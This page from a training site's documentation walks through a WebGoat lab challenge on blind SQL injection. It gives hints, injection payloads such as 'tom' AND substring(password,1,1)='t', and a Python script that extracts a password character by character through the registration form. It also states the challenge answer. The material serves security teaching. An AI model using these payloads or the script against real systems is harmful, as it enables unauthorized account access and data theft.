---
title: "A3:2021 |SQL Injection Advanced (5) | Cycubix Docs"
layout: default
nav_order: 5
parent: "A3:2021 | SQL Injection Advanced | Cycubix Docs"
grand_parent: "A3:2021 | Injection | Cycubix Docs"
---
# A3:2021 |SQL Injection Advanced (5) | Cycubix Docs

We now explained the basic steps involved in an SQL injection. In this assignment you will need to combine all the things we explained in the SQL lessons.

Goal: Can you login as Tom?

Have fun!

![](<../../../../../.gitbook/assets/Screenshot 2020-04-28 at 12.08.26.png>)

#### Hints

* The table name is randomized at each start of WebGoat, try to figure out the name first.
* Find the field which is vulnerable to SQL injection use that to change the password.
* Change the password through an UPDATE Statement.
* The vulnerable field is the username field of the register form.
* Look at the different response you receive from the server. 
* The vulnerability is on the register form. 
* Use tooling to automate this attack. 

#### Solution

* From the hints we know that the vulnerable field is in the username field on the register form. 
* We can also use in our basic SQL Injection setup a pre-configured user name such as Tom. We will see that the user is already registered. 
* We can guess that the table we are seeking is named `password` (_guessing_). 
* If we try to register with the following username: `tom' AND '1'='1` we find that the username is taken.

<figure><img src="../../../../../.gitbook/assets/tom sql advances.png" alt=""><figcaption></figcaption></figure>

* So the basic initial SQL injection will start with Tom, and then close the Statement. Tom'. We need to find Tom's password in order to log in. 
* Using a Blind Injection SQL we can ask the database for true and false responses and determine the answer according to the application response. 
* The initial part of the input (`"Tom'`) closes the current SQL statement or string context. We can add the condition `substring(password, 1, 1) = 't` to check if the first character of the password is `'t`.

Tom' AND substring(password, 1, 1) = 't

* How can we automate the attack with Burp or Zap?. We can either use the intruder, selecting the variable to attack and find the rest of the characters after the 't' on the password. The tools available are Fuzz (Zap) or Intruder/brute force (Burp). 
* We can also automate the procedure to find the solution using Python and the following script: 

```
import json  
import requests  
  
def sql_injection_advance_5():  
     alphabet_index = 0  
     alphabet = 'abcdefghijklmnopqrstuvwxyz'  
     password_index = 0  
     password = ''  
  
     headers = {  
        'Cookie': COOKIE,  
     }  
  
     while True:  
         payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])  
  
         data = {  
             'username_reg': payload,  
             'email_reg': 'a@a',  
             'password_reg': 'a',  
             'confirm_password_reg': 'a'  
         }  
  
         r = requests.put('http://HOST:PORT/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
  
         try:  
             response = json.loads(r.text)  
         except:  
             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
             return  
  
         if "already exists please try to register with a different username" not in response['feedback']:  
             alphabet_index += 1  
             if alphabet_index > len(alphabet) - 1:  
                 return  
         else:  
             password += alphabet[alphabet_index]  
             print(password)  
             alphabet_index = 0  
             password_index += 1  
  
sql_injection_advance_5()
```

* Tom's password is: thisisasecretfortomonly.

